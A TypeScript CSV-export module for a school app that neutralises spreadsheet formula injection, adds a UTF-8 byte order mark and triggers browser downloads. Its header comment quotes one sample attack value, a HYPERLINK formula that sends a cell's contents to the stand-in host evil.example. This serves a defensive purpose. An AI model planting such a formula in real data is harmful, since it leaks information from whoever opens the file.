/**
 * One place where CSV is produced, so every export in the app behaves the same.
 *
 * Three things here are not obvious and are the reason this is shared rather
 * than written inline at each call site:
 *
 * 1. Formula injection. A cell whose text begins with = + - @ or a control
 *    character is executed as a formula when the file is opened in Excel,
 *    LibreOffice or Google Sheets. Names, addresses and remarks in this app all
 *    come from spreadsheets uploaded by staff, so a value like
 *    =HYPERLINK("https://evil.example/?x="&A1,"Click") is something a parent
 *    could put in an admission form and an admin would later re-export and open.
 *    Prefixing with a single quote neutralises it and is the convention every
 *    spreadsheet program understands.
 *
 * 2. The byte order mark. Excel on Windows assumes the system code page unless
 *    the file starts with a UTF-8 BOM. Without it, "Sharanya Ramanathan" is
 *    fine but "ಶರಣ್ಯಾ" and "சரண்யா" come out as mojibake — and this is a school
 *    in Bengaluru whose own UI ships in Kannada and Tamil.
 *
 * 3. CRLF. Excel is the consumer here, not a Unix pipe.
 */

export type Cell = string | number | boolean | null | undefined;

// Leading characters a spreadsheet treats as the start of a formula.
const FORMULA_START = /^[=+\-@\t\r]/;

export function escapeCell(value: Cell): string {
  const raw = value === null || value === undefined ? "" : String(value);
  // Neutralise first, then quote, so the guard character is inside the quotes.
  const safe = FORMULA_START.test(raw) ? `'${raw}` : raw;
  return /[",\r\n]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
}

export function toCsv(rows: Record<string, Cell>[], headers?: string[]): string {
  if (!rows.length) return "";
  const cols = headers ?? Object.keys(rows[0]);
  const lines = [
    cols.map(escapeCell).join(","),
    ...rows.map((r) => cols.map((c) => escapeCell(r[c])).join(",")),
  ];
  return "﻿" + lines.join("\r\n") + "\r\n";
}

/**
 * Trigger a download in the browser.
 *
 * The anchor is attached to the document before clicking because Firefox
 * ignores a click on a detached node, and the object URL is revoked on a later
 * tick because Safari cancels an in-flight download if it is revoked
 * synchronously.
 */
export function downloadCsv(filename: string, csv: string): void {
  const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename.endsWith(".csv") ? filename : `${filename}.csv`;
  a.style.display = "none";
  document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 0);
}
